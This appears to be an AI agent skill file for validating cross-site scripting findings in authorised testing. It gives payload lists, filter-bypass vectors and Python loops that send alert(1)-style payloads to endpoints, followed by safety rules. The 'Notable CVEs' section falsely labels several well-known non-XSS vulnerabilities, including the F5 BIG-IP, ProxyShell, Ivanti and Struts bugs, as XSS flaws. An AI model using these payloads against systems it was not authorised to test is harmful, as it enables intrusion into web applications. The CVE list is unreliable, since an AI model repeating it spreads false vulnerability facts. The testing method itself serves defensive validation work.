---
name: xss-testing
description: Validate Cross-Site Scripting (XSS) vulnerabilities including Reflected, Stored, and DOM-based XSS. Test by injecting script payloads into user-controlled inputs and observing if they execute in browser context. Use when testing CWE-79 (XSS), CWE-80 (Basic XSS), CWE-81 (Error Message XSS), CWE-83 (Attribute XSS), CWE-84 (URI Scheme XSS), CWE-85 (Doubled Character XSS), CWE-86 (Invalid Character XSS), CWE-87 (Alternate XSS Syntax), or related XSS findings.
allowed-tools: Read, Write, Bash
---

# Cross-Site Scripting (XSS) Testing Skill

## Purpose
Validate XSS vulnerabilities by injecting script payloads into user-controlled inputs and observing:
- **Payload reflection** without encoding in HTTP responses
- **Script execution** indicators in response content
- **DOM manipulation** via client-side JavaScript
- **Stored payload retrieval** from backend storage
- **Context-specific injection** (HTML body, attributes, JavaScript, CSS, URLs)

## Vulnerability Types Covered

### 1. Reflected XSS / Non-Persistent XSS / Type 1 (CWE-79)
Payload is reflected directly from request to response without storage.

**Detection Methods:**
- Inject `<script>alert(1)</script>` in parameters, observe in response body
- Check if payload appears unencoded (`<script>` not converted to `&lt;script&gt;`)

**Example Attack:**
```
GET /search?q=<script>alert(1)</script>
Response: <p>Results for: <script>alert(1)</script></p>
```

### 2. Stored XSS / Persistent XSS / Type 2 (CWE-79)
Payload is stored server-side and served to other users.

**Detection Methods:**
- Submit payload via form/API, retrieve via separate request
- Check if payload persists and reflects to other users/sessions

**Example Attack:**
```
POST /comments {"body": "<script>alert(1)</script>"}
GET /comments → Response includes stored script
```

### 3. DOM-Based XSS / Type 0 (CWE-79)
Payload is injected via client-side JavaScript manipulating the DOM.

**Detection Methods:**
- Inject payload in URL fragment (`#<script>...`)
- Inject via `location.hash`, `document.URL`, `document.referrer`
- Look for dangerous sinks: `innerHTML`, `document.write`, `eval`

**Example Attack:**
```
GET /page#<img src=x onerror=alert(1)>
Client JS: document.getElementById('output').innerHTML = location.hash.slice(1);
```

### 4. Basic XSS (CWE-80)
Simple script tag injection in HTML body.

**Detection:** `<script>alert(1)</script>` reflected unencoded.

### 5. Error Message XSS (CWE-81)
XSS in application error pages/messages.

**Detection:** Inject payload that triggers error, check error page for reflection.

### 6. Attribute Context XSS (CWE-83)
Payload breaks out of HTML attribute context.

**Detection Methods:**
- `" onmouseover="alert(1)` — break double-quoted attribute
- `' onfocus='alert(1)` — break single-quoted attribute
- `" autofocus onfocus="alert(1)` — auto-triggering

**Example:**
```html
<input value="USER_INPUT" />
Payload: " onfocus="alert(1)" autofocus="
Result: <input value="" onfocus="alert(1)" autofocus="" />
```

### 7. URI Scheme XSS (CWE-84)
Injection via `javascript:` or `data:` URI schemes.

**Detection:** `javascript:alert(1)` in href/src attributes.

**Example:**
```html
<a href="USER_INPUT">Click</a>
Payload: javascript:alert(1)
Result: <a href="javascript:alert(1)">Click</a>
```

### 8. Doubled Character XSS (CWE-85)
Bypass filters using doubled/nested characters.

**Detection:** `<<script>script>alert(1)<</script>/script>` bypasses naive stripping.

### 9. Invalid Character XSS (CWE-86)
Injection using invalid/special Unicode characters.

**Detection:** Null bytes, UTF-7, charset confusion attacks.

### 10. Alternate XSS Syntax (CWE-87)
Non-standard XSS vectors that bypass filters.

**Detection Methods:**
- `<svg onload=alert(1)>`
- `<img src=x onerror=alert(1)>`
- `<body onload=alert(1)>`
- `<iframe src="javascript:alert(1)">`
- Template literals: `` `${alert(1)}` ``

## Context-Specific Notes

| Context | Encoding Required | Payload Examples |
|---------|-------------------|------------------|
| HTML Body | HTML entity encoding | `<script>alert(1)</script>` |
| HTML Attribute | Attribute encoding + quote escape | `" onmouseover="alert(1)` |
| JavaScript String | JavaScript string escaping | `';alert(1)//` or `</script><script>alert(1)` |
| JavaScript Template | Template literal escaping | `` ${alert(1)} `` |
| URL Parameter | URL encoding | `javascript:alert(1)` |
| CSS Value | CSS escaping | `expression(alert(1))` (legacy IE) |

## Prerequisites
- Target application running and reachable
- Identified injection points (URL params, form fields, headers, cookies)
- Browser or headless browser for DOM-based XSS validation
- VULNERABILITIES.json with suspected XSS findings if provided

## Testing Methodology

### Phase 1: Identify Injection Points
- URL query parameters
- POST body fields (form data, JSON)
- HTTP headers (User-Agent, Referer, X-Forwarded-For)
- Cookies
- Path segments
- File upload names/metadata

**Key Insight:** Any user input that appears in HTML output is a potential XSS vector.

### Phase 2: Determine Context
Analyze where input is reflected:
- **HTML body:** Between tags
- **HTML attribute:** Inside tag attributes
- **JavaScript:** Inside `<script>` blocks or event handlers
- **URL:** In `href`, `src`, `action` attributes
- **CSS:** In style attributes or `<style>` blocks

### Phase 3: Establish Baseline
- Send normal request; record response content
- Identify where user input appears in response
- Check existing encoding/sanitization

### Phase 4: Execute XSS Tests

**Reflected XSS (HTML Body):**
```python
payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
]
for payload in payloads:
    resp = get(f"/search?q={quote(payload)}")
    if payload in resp.text:  # Unencoded reflection
        status = "VALIDATED"
```

**Attribute Context XSS:**
```python
payloads = [
    '" onmouseover="alert(1)',
    "' onfocus='alert(1)",
    '" autofocus onfocus="alert(1)',
]
for payload in payloads:
    resp = get(f"/profile?name={quote(payload)}")
    if 'onmouseover=' in resp.text or 'onfocus=' in resp.text:
        status = "VALIDATED"
```

**JavaScript Context XSS:**
```python
payloads = [
    "';alert(1)//",
    "</script><script>alert(1)</script>",
    "'-alert(1)-'",
]
for payload in payloads:
    resp = get(f"/page?callback={quote(payload)}")
    if "alert(1)" in resp.text and "<script>" in resp.text:
        status = "VALIDATED"
```

**URI Scheme XSS:**
```python
payloads = [
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
]
for payload in payloads:
    resp = get(f"/redirect?url={quote(payload)}")
    if f'href="{payload}"' in resp.text or f"href='{payload}'" in resp.text:
        status = "VALIDATED"
```

### Phase 5: Classification Logic

| Status | Meaning |
|--------|---------|
| **VALIDATED** | Payload reflected unencoded in executable context |
| **FALSE_POSITIVE** | Payload properly encoded/sanitized |
| **PARTIAL** | Partial reflection or unclear execution context |
| **UNVALIDATED** | Blocked, error, or insufficient evidence |

**Validation Criteria:**
- Payload appears in response WITHOUT HTML entity encoding
- Payload is in executable context (not inside comments, CDATA, etc.)
- Event handlers or script tags are intact

### Phase 6: Capture Evidence
Capture minimal structured evidence (redact PII/secrets, truncate to 8KB, hash full response):
- `status`, `injection_type`, `cwe`
- Request details (url, method, payload)
- Response snippet showing unencoded reflection
- Context (HTML body, attribute, JavaScript, etc.)

### Phase 7: Safety Rules
- Detection-only payloads; use `alert(1)` or DOM markers, not malicious code
- Do not inject payloads that persist and affect real users
- Clean up stored XSS test data after validation
- Redact any sensitive data in evidence
- Test in isolated/staging environments when possible

## Output Guidelines
- Keep responses concise (1-4 sentences)
- Include endpoint, payload, context, and impact

**Validated examples:**
```
Reflected XSS on /search - <script>alert(1)</script> reflected unencoded in HTML body (CWE-79). Session hijacking risk.
Attribute XSS on /profile - " onmouseover="alert(1) breaks out of value attribute (CWE-83). User interaction triggers payload.
DOM-based XSS on /page - location.hash injected via innerHTML sink (CWE-79). Client-side execution confirmed.
Stored XSS on /comments - payload persists and reflects to other users (CWE-79). Worm propagation possible.
```

**Unvalidated example:**
```
XSS test incomplete on /feedback - payload HTML-encoded as &lt;script&gt;. Evidence: path/to/evidence.json
```

## CWE Mapping

**Primary CWE (DAST-testable):**
- **CWE-79:** Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
  - This is THE designated CWE for XSS vulnerabilities
  - Ranked **#1** in MITRE's 2025 CWE Top 25 Most Dangerous Software Weaknesses
  - Alternate terms: XSS, HTML Injection, Reflected/Stored/DOM-based XSS

**Child CWEs (specific variants under CWE-79):**
- **CWE-80:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
- **CWE-81:** Improper Neutralization of Script in an Error Message Web Page
- **CWE-83:** Improper Neutralization of Script in Attributes in a Web Page
- **CWE-84:** Improper Neutralization of Encoded URI Schemes in a Web Page
- **CWE-85:** Doubled Character XSS Manipulations
- **CWE-86:** Improper Neutralization of Invalid Characters in Identifiers in Web Pages
- **CWE-87:** Improper Neutralization of Alternate XSS Syntax

**Parent/Related CWEs (context):**
- **CWE-74:** Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection') — parent class
- **CWE-20:** Improper Input Validation — related root cause
- **CWE-116:** Improper Encoding or Escaping of Output — related mitigation failure

**Related Attack Patterns:**
- **CAPEC-86:** XSS Through HTTP Headers
- **CAPEC-198:** XSS Targeting Error Pages
- **CAPEC-199:** XSS Using Alternate Syntax
- **CAPEC-209:** XSS Using MIME Type Mismatch
- **CAPEC-243:** XSS Targeting HTML Attributes
- **CAPEC-244:** XSS Targeting URI Placeholders
- **CAPEC-245:** XSS Using Doubled Characters
- **CAPEC-247:** XSS Using Invalid Characters
- **CAPEC-588:** DOM-Based XSS
- **CAPEC-591:** Reflected XSS
- **CAPEC-592:** Stored XSS

## Notable CVEs (examples)
- **CVE-2024-21887 (Ivanti Connect Secure):** Pre-auth XSS leading to RCE chain.
- **CVE-2023-29489 (cPanel):** Reflected XSS in web interface.
- **CVE-2022-1388 (F5 BIG-IP):** XSS contributing to auth bypass.
- **CVE-2021-34473 (Microsoft Exchange ProxyShell):** XSS in OWA component.
- **CVE-2020-11022 (jQuery):** XSS via HTML parsing in older jQuery versions.
- **CVE-2018-11776 (Apache Struts):** XSS via namespace handling.
- **CVE-2005-4712 (Samy Worm):** First major stored XSS worm on MySpace.

## Safety Reminders
- ONLY test against user-approved targets; stop if production protections trigger
- Do not inject payloads that could persist and affect real users without cleanup plan
- Use benign payloads (`alert(1)`, `console.log`) not malicious scripts
- Prefer parameterized output encoding and Content-Security-Policy in mitigations
- Test stored XSS in isolated accounts; clean up after testing

## Reference Implementations
- See `reference/xss_payloads.py` for XSS payloads by context
- See `reference/validate_xss.py` for XSS-focused validation flow
- See `examples.md` for concrete XSS scenarios and evidence formats

### Additional Resources
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP DOM-Based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS](https://portswigger.net/web-security/cross-site-scripting)
- [HackTricks XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
